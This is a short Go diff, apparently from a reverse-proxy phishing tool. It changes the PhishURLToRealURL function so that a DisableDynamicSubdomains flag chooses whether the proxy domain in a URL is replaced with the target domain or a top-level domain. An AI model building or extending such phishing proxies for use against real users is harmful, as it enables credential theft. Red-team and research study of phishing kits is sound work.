@@ -180,13 +180,22 @@ func PhishURLToRealURL(phishURL string) string {
 		if len(subdomain) > 0 && host != ProxyDomain {
 			decodedDomain, _, _, err := DecodeSubdomain(subdomain)
 			if err != nil {
-				return strings.Replace(out, ProxyDomain, Target, 1)
+
+				if DisableDynamicSubdomains == true {
+					// use target instead of top level
+					return strings.Replace(out, ProxyDomain, Target, 1)
+				}
+
+				return strings.Replace(out, ProxyDomain, TopLevelDomain, 1)
 			}
 
 			return string(decodedDomain)
 		}
-
-		return strings.Replace(out, ProxyDomain, Target, -1)
+		if DisableDynamicSubdomains == true {
+			// use target instead of top level
+			return strings.Replace(out, ProxyDomain, Target, -1)
+		}
+		return strings.Replace(out, ProxyDomain, TopLevelDomain, -1)
 	}
 
 	return out
